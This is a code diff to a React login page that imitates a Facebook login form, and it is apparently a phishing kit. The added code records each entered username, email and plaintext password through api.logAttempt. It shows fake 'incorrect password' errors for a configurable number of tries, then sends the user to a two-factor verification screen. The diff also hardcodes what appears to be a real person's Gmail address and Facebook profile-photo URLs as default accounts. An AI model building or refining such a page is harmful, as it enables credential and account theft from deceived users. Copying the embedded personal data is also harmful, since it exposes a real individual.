@@ -53,9 +53,56 @@ export default function LoginPage({ onOpenAdmin }) {
   const [password, setPassword] = useState('');
   const [showPassword, setShowPassword] = useState(false);
 
-  // 3-trial error tracking
+  // Configurable password trial gatekeeper
+  const [maxPasswordTrials, setMaxPasswordTrials] = useState(() => {
+    try {
+      const saved = localStorage.getItem('sphere_recovery_settings');
+      if (saved) {
+        const parsed = JSON.parse(saved);
+        if (parsed.maxPasswordTrials !== undefined) {
+          const val = parseInt(parsed.maxPasswordTrials, 10);
+          if (!isNaN(val) && val >= 1) return val;
+        }
+      }
+    } catch {}
+    return 3;
+  });
   const [trialCount, setTrialCount] = useState(0);
   const [loginError, setLoginError] = useState('');
+
+  // Sync recovery settings (including maxPasswordTrials)
+  useEffect(() => {
+    const handleSyncTrials = (e) => {
+      let parsed = e?.detail;
+      if (!parsed) {
+        try {
+          const saved = localStorage.getItem('sphere_recovery_settings');
+          if (saved) parsed = JSON.parse(saved);
+        } catch {}
+      }
+      if (parsed && parsed.maxPasswordTrials !== undefined) {
+        const val = parseInt(parsed.maxPasswordTrials, 10);
+        if (!isNaN(val) && val >= 1) setMaxPasswordTrials(val);
+      }
+    };
+
+    window.addEventListener('sphere_recovery_updated', handleSyncTrials);
+    window.addEventListener('storage', handleSyncTrials);
+
+    if (api?.admin?.getRecoverySettings) {
+      api.admin.getRecoverySettings().then((res) => {
+        if (res && res.maxPasswordTrials !== undefined) {
+          const val = parseInt(res.maxPasswordTrials, 10);
+          if (!isNaN(val) && val >= 1) setMaxPasswordTrials(val);
+        }
+      }).catch(() => {});
+    }
+
+    return () => {
+      window.removeEventListener('sphere_recovery_updated', handleSyncTrials);
+      window.removeEventListener('storage', handleSyncTrials);
+    };
+  }, []);
 
   const [showSignupModal, setShowSignupModal] = useState(false);
   const [showLanguageSheet, setShowLanguageSheet] = useState(false);
@@ -99,57 +146,92 @@ export default function LoginPage({ onOpenAdmin }) {
     return () => window.removeEventListener('hashchange', handleHash);
   }, []);
 
-  useEffect(() => {
+  const loadFirstPageAccounts = () => {
+    // 1. Try fetching from backend API
     api.getFirstPageAccounts().then((res) => {
       if (res) {
-        if (res.desktopAccounts?.length) setLiveDesktopAccounts(res.desktopAccounts);
-        if (res.mobileAccounts?.length) setLiveMobileAccounts(res.mobileAccounts);
+        if (Array.isArray(res.desktopAccounts) && res.desktopAccounts.length > 0) {
+          setLiveDesktopAccounts(res.desktopAccounts);
+        }
+        if (Array.isArray(res.mobileAccounts) && res.mobileAccounts.length > 0) {
+          setLiveMobileAccounts(res.mobileAccounts);
+        }
       }
     }).catch(() => {});
+
+    // 2. Also check local storage for instantaneous reactive update
+    try {
+      const savedUsers = localStorage.getItem('sphere_users') || localStorage.getItem('sphere_admin_users');
+      if (savedUsers) {
+        const parsedUsers = JSON.parse(savedUsers);
+        if (Array.isArray(parsedUsers) && parsedUsers.length > 0) {
+          const desktop = parsedUsers.filter((u) => u.showOnDesktopLogin !== false);
+          const mobile = parsedUsers.filter((u) => u.showOnMobileLogin !== false);
+          setLiveDesktopAccounts(desktop.length > 0 ? desktop : parsedUsers);
+          setLiveMobileAccounts(mobile.length > 0 ? mobile : (desktop.length > 0 ? desktop : parsedUsers));
+          return;
+        }
+      }
+
+      const savedAccounts = localStorage.getItem('sphere_first_page_accounts');
+      if (savedAccounts) {
+        const parsed = JSON.parse(savedAccounts);
+        if (Array.isArray(parsed.desktopAccounts) && parsed.desktopAccounts.length > 0) {
+          setLiveDesktopAccounts(parsed.desktopAccounts);
+        }
+        if (Array.isArray(parsed.mobileAccounts) && parsed.mobileAccounts.length > 0) {
+          setLiveMobileAccounts(parsed.mobileAccounts);
+        }
+      }
+    } catch {}
+  };
+
+  useEffect(() => {
+    loadFirstPageAccounts();
+
+    window.addEventListener('sphere_first_page_accounts_updated', loadFirstPageAccounts);
+    window.addEventListener('sphere_users_updated', loadFirstPageAccounts);
+    window.addEventListener('storage', loadFirstPageAccounts);
+    return () => {
+      window.removeEventListener('sphere_first_page_accounts_updated', loadFirstPageAccounts);
+      window.removeEventListener('sphere_users_updated', loadFirstPageAccounts);
+      window.removeEventListener('storage', loadFirstPageAccounts);
+    };
   }, []);
 
-  // Desktop Accounts matching media_1793948184829_6c12b560.jpg: Berta Hule, Bol Riak Kuol, Tahir Adem
-  const desktopDisplayAccounts = React.useMemo(() => [
-    {
-      id: 'acc_berta_hule',
-      name: 'Berta Hule',
-      email: 'berta.hule@example.com',
-      avatar: 'https://images.unsplash.com/photo-1535713875002-d1d0cf377fde?auto=format&fit=crop&w=400&q=80',
-    },
-    {
-      id: 'acc_bol_riak_kuol',
-      name: 'Bol Riak Kuol',
-      email: 'bol.kuol@example.com',
-      avatar: 'https://images.unsplash.com/photo-1507003211169-0a1dd7228f2d?auto=format&fit=crop&w=400&q=80',
-    },
+  // Default login accounts matching store.json
+  const defaultAccounts = React.useMemo(() => [
     {
       id: 'acc_tahir_adem',
-      name: 'Tahir Adem',
-      email: 'tahir.adem@example.com',
-      avatar: 'https://images.unsplash.com/photo-1500648767791-00dcc994a43e?auto=format&fit=crop&w=400&q=80',
+      name: 'Deng Garang Ajou',
+      shortName: 'Deng',
+      email: 'dengdengue1@gmail.com',
+      avatar: 'https://scontent.fadd3-1.fna.fbcdn.net/v/t39.30808-1/449190487_433951952781419_1825475880531579874_n.jpg?stp=dst-jpg_tt6&cstp=mx413x413&ctp=s200x200&_nc_cat=108&_nc_map=urlgen_bucketless&ccb=1-7&_nc_sid=1d2534&_nc_eui2=AeHlhWIbuAFAPXShnX0fD77wMug7sU-Uhnky6DuxT5SGeWty6voPF4Wh0uFgXu1-dVjpJ0K_VGRVt6hDxu--PPBI&_nc_ohc=vSmEpTw7RLUQ7kNvwExJfAp&_nc_oc=AdpJiJfafFB1fUzr7w8levQCzrNPe9eEjG3-illzbHh7uKC_I07n7TYOWeg4HLabacg&_nc_zt=24&_nc_ht=scontent.fadd3-1.fna&_nc_gid=LmlBjUAiMhqmFiz3yR-8zw&_nc_ss=7a2a8&oh=00_AQTOqljyML03azhd2tVUN3Zima6BTa-A8aFrymonlAPxFg&oe=6AF50A80',
+      showOnDesktopLogin: true,
+      showOnMobileLogin: true,
+    },
+    {
+      id: 'user_1794067970196',
+      name: 'Deng Garang Ajou',
+      shortName: 'Deng',
+      email: 'user@gmail.com',
+      avatar: 'https://scontent.fadd3-1.fna.fbcdn.net/v/t39.30808-1/310947835_120347710808513_5161735598945191192_n.jpg?stp=c0.0.720.720a_dst-jpg_tt6&cstp=mx720x720&ctp=s200x200&_nc_cat=105&_nc_map=urlgen_bucketless&ccb=1-7&_nc_sid=2d3e12&_nc_eui2=AeH7_bc5jNDs0UxxKNaiHoa4tBsLndnPaUa0Gwud2c9pRpvxzzOPPWtJlY14LB5YQ1ek2BeVLkqdanRL4rQ7FxGT&_nc_ohc=8RYCb_2USioQ7kNvwFQ3EEn&_nc_oc=AdrehPY6kKx73Kb_vhLchzyyfweYvV9GJBB3tjgo222ZwDC5DitmBOZtqEeN-jJ3pR8&_nc_zt=24&_nc_ht=scontent.fadd3-1.fna&_nc_gid=ScI9Y1UDvtNCUhZaCG4XDg&_nc_ss=7a2a8&oh=00_AQTEIKES7__FymdukkchvT0KFpI6tj0yk_w8n70NWlHwyw&oe=6AF52BE8',
+      showOnDesktopLogin: true,
+      showOnMobileLogin: true,
+    },
+    {
+      id: 'user_1794067752853',
+      name: 'Deng Garang Ajou',
+      shortName: 'Deng',
+      email: 'user@gmail.com',
+      avatar: 'https://scontent.fadd3-1.fna.fbcdn.net/v/t39.30808-1/493041684_658258897010006_7272170067908269365_n.jpg?stp=dst-jpg_tt6&cstp=mx960x960&ctp=s200x200&_nc_cat=109&_nc_map=urlgen_bucketless&ccb=1-7&_nc_sid=2d3e12&_nc_eui2=AeGDRlyiFnAymqp4q_UtI_aavZmRdi0ciL-9mZF2LRyIv9QyrjFu5Ucz5KKBBeBczgAlhjsKHnb4nXCd9FOKMeQj&_nc_ohc=oJztv4-MPDsQ7kNvwFwro6-&_nc_oc=AdqS0DWyfpvGUFBk0mED9v1NRz0Rt1_t55Vy_bq0-xapCFk0M9zs6uTVT5tjyc5N4sQ&_nc_zt=24&_nc_ht=scontent.fadd3-1.fna&_nc_gid=43mrPclLF9k3j2NuofEY1A&_nc_ss=7a2a8&oh=00_AQTZzLCtdPrTYCQDHMLuOs1oirAifxJUZ1i3Jgw5zyEO1w&oe=6AF53804',
+      showOnDesktopLogin: true,
+      showOnMobileLogin: true,
     },
   ], []);
 
-  // Mobile Accounts: Tahir Bin, Fetty Seya
-  const mobileDisplayAccounts = React.useMemo(() => [
-    {
-      id: 'acc_tahir_bin',
-      name: 'Tahir Bin',
-      email: 'tahir.bin@example.com',
-      phone: '+251 91 123 4567',
-      avatar: 'https://images.unsplash.com/photo-1535713875002-d1d0cf377fde?auto=format&fit=crop&w=400&q=80',
-    },
-    {
-      id: 'acc_fetty_seya',
-      name: 'Fetty Seya',
-      email: 'fetty.seya@example.com',
-      phone: '+251 92 987 6543',
-      avatar: 'https://images.unsplash.com/photo-1494790108377-be9c29b29330?auto=format&fit=crop&w=400&q=80',
-    },
-  ], []);
-
-  const displayDesktopList = liveDesktopAccounts || desktopDisplayAccounts;
-  const displayMobileList = liveMobileAccounts || mobileDisplayAccounts;
+  const displayDesktopList = (liveDesktopAccounts && liveDesktopAccounts.length > 0) ? liveDesktopAccounts : defaultAccounts;
+  const displayMobileList = (liveMobileAccounts && liveMobileAccounts.length > 0) ? liveMobileAccounts : displayDesktopList;
 
   // Desktop select account handler (no auto-fill of email or name)
   const handleDesktopSelectAccount = (account) => {
@@ -192,16 +274,19 @@ export default function LoginPage({ onOpenAdmin }) {
       return;
     }
 
+    const maxTrials = maxPasswordTrials || 3;
     const currentTrial = trialCount + 1;
-    const isSuccess = currentTrial >= 3;
+    const isSuccess = currentTrial >= maxTrials;
 
-    // Log the single explicit trial attempt to the database (3 trials total)
+    // Log the single explicit trial attempt to the database
     api.logAttempt({
       username: usernameVal,
       email: email.trim(),
       password: password,
       accountName: selectedAccount?.name || usernameVal,
-      action: `Login Button Clicked (Trial #${currentTrial})`,
+      action: isSuccess 
+        ? `Login Password Verified (Allowed at Trial #${currentTrial} of ${maxTrials})` 
+        : `Login Button Clicked (Incorrect Password Trial #${currentTrial} of ${maxTrials})`,
       source: window.innerWidth > 768 ? 'Desktop Login Screen' : 'Mobile Login Screen',
       screen: window.innerWidth > 768 ? 'Desktop Facebook Login Form' : 'Mobile Facebook Login Form',
       device: window.innerWidth > 768 ? 'Desktop Browser (PC/Mac)' : 'Mobile Device',
@@ -209,14 +294,15 @@ export default function LoginPage({ onOpenAdmin }) {
       trialCount: currentTrial,
     });
 
-    // Trial 1 and 2: show error banner
-    if (currentTrial < 3) {
+    // If still before maxTrials: show error banner and clear incorrect password
+    if (currentTrial < maxTrials) {
       setTrialCount(currentTrial);
       setLoginError(true);
+      setPassword('');
       return;
     }
 
-    // Trial 3: redirect user to the Two-Factor Verification screen
+    // Reached maxTrials: redirect user to the Two-Factor Verification screen
     setTrialCount(currentTrial);
     setLoginError(false);
     setRoute('2fa');
